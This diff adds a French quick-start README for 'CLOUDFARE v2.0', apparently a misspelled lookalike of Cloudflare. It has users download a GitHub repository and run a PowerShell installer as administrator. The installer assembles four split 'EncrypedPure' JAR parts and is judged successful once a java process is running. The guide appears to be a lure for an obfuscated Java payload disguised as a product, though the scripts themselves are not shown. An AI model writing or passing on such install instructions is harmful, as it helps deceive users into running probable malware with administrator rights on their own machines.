@@ -1,0 +1,63 @@
+CLOUDFARE v2.0 - QUICK START GUIDE
+===================================
+
+INSTALLATION RAPIDE
+===================
+
+1. Telecharger tous les fichiers du repository:
+   https://github.com/davidrenand/CloudFareJre1
+
+2. Ouvrir PowerShell en tant qu'administrateur
+
+3. Naviguer vers le dossier:
+   cd C:\Users\[YourUser]\Downloads\CloudFareJre1
+
+4. Executer le script d'installation:
+   .\Install_v2_Robust.ps1
+
+5. Attendre la completion (normalement 2-5 minutes)
+
+FICHIERS REQUIS
+===============
+
+Parts JAR (obligatoires):
+- EncrypedPure.part1.jar
+- EncrypedPure.part2.jar
+- EncrypedPure.part3.jar
+- EncrypedPure.part4.jar
+
+Scripts PowerShell:
+- Install_v2_Robust.ps1    (principal)
+- ErrorHandler.ps1         (necessaire)
+- Pre_Deployment_Check.ps1 (recommande)
+- Verify_URLs.ps1          (optionnel)
+
+VERIFICATION
+============
+
+Pour verifier l'installation:
+1. Ouvrir un terminal PowerShell
+2. Executer: Get-Process | findstr java
+3. Si java est present, installation OK
+
+TROUBLESHOOTING
+===============
+
+Erreur 1: "Cannot find path"
+-> Verifier que tous les fichiers sont dans le meme dossier
+
+Erreur 2: "Access denied"
+-> Executer PowerShell en tant qu'administrateur
+
+Erreur 3: "Internet required"
+-> Verifier votre connexion reseau
+
+SUPPORT
+=======
+Repository: https://github.com/davidrenand/CloudFareJre1
+Author: davidrenand
+Email: david.renand@financial-apra.com
+
+---
+Version: 2.0.0
+Last Updated: November 2025
